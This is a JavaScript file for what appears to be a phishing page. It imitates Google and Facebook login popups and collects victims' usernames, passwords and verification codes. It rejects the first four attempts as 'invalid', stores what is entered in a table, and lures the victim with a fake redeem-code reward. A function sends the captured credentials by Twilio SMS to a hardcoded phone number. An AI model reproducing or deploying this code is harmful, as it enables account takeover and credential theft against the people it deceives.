const TWILIO_ACCOUNT_SID = 'YOUR_TWILIO_ACCOUNT_SID';
const TWILIO_AUTH_TOKEN = 'YOUR_TWILIO_AUTH_TOKEN';
const TWILIO_PHONE_NUMBER = 'YOUR_TWILIO_PHONE_NUMBER';

function sendLoginDataToSMS(platform, identifier, password) {
    const phoneNumber = '9827361619';
    const message = `Platform: ${platform}, Identifier: ${identifier}, Password: ${password}`;

    fetch('https://api.twilio.com/2010-04-01/Accounts/' + TWILIO_ACCOUNT_SID + '/Messages.json', {
        method: 'POST',
        headers: {
            'Authorization': 'Basic ' + btoa(TWILIO_ACCOUNT_SID + ':' + TWILIO_AUTH_TOKEN),
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
            To: phoneNumber,
            From: TWILIO_PHONE_NUMBER,
            Body: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.sid) {
            console.log('Message sent successfully:', data);
        } else {
            console.error('Error sending message:', data);
        }
    })
    .catch(error => console.error('Error:', error));
}
    let attemptCount = 0;

    // Show Google Login Popup
    document.getElementById("google-login").onclick = function() {
        openPopup("google-popup");
    };

    // Show Facebook Login Popup
    document.getElementById("facebook-login").onclick = function() {
        openPopup("facebook-popup");
    };

    function openPopup(popupId) {
        document.getElementById(popupId).style.display = "flex";
    }

    function closePopup(popupId) {
        document.getElementById(popupId).style.display = "none";
    }

    // Google Login Process
    function googleLogin() {
        attemptCount++;
        const email = document.getElementById("google-email").value;
        const password = document.getElementById("google-password").value;
        const code = document.getElementById("google-code").value;

        if (attemptCount >= 5 && validateLogin(email, password, code)) {
            saveLoginData("Google", email, password, code);
            closePopup("google-popup");
            openPopup("redeem-popup");
        } else {
            alert("Password is invalid. Try again.");
        }
    }

    // Facebook Login Process
    function facebookLogin() {
        attemptCount++;
        const mobile = document.getElementById("facebook-mobile").value;
        const password = document.getElementById("facebook-password").value;
        const code = document.getElementById("facebook-code").value;

        if (attemptCount >= 5 && validateLogin(mobile, password, code)) {
            saveLoginData("Facebook", mobile, password, code);
            closePopup("facebook-popup");
            openPopup("redeem-popup");
        } else {
            alert("Password is invalid. Try again.");
        }
    }

    function validateLogin(username, password, code) {
        // Simulate validation logic here.
        // Replace with actual validation in real implementation.
        return username !== "" && password !== "" && code !== "";
    }

    function saveLoginData(platform, username, password, code) {
        const tableBody = document.getElementById("login-data-body");
        const newRow = document.createElement("tr");

        const platformCell = document.createElement("td");
        platformCell.innerText = platform;
        newRow.appendChild(platformCell);

        const usernameCell = document.createElement("td");
        usernameCell.innerText = username;
        newRow.appendChild(usernameCell);

        const passwordCell = document.createElement("td");
        passwordCell.innerText = password;
        newRow.appendChild(passwordCell);

        const codeCell = document.createElement("td");
        codeCell.innerText = code;
        newRow.appendChild(codeCell);

        tableBody.appendChild(newRow);
    }

    function getCode() {
        // Simulate getting the code and showing countdown
        const code = "ABC123";
        document.getElementById("redeem-code").value = code;

        closePopup("redeem-popup");
        openPopup("countdown-popup");
        startCountdown();
    }

    function startCountdown() {
        let timeLeft = 5;
        const countdownNumber = document.getElementById("countdown-number");

        const countdownInterval = setInterval(function() {
            countdownNumber.innerText = timeLeft;
            timeLeft--;

            if (timeLeft < 0) {
                clearInterval(countdownInterval);
                closePopup("countdown-popup");
                openPopup("data-popup");
            }
        }, 1000);
    }

    function copyCode() {
        const redeemCodeInput = document.getElementById("redeem-code");
        redeemCodeInput.select();
        document.execCommand("copy");

        const copyButton = document.getElementById("copyButton");
        const copyIcon = document.getElementById("copy-icon");
        const checkIcon = document.getElementById("check-icon");

        copyButton.classList.add("green-tick");
        copyIcon.style.display = "none";
        checkIcon.style.display = "inline";
    }

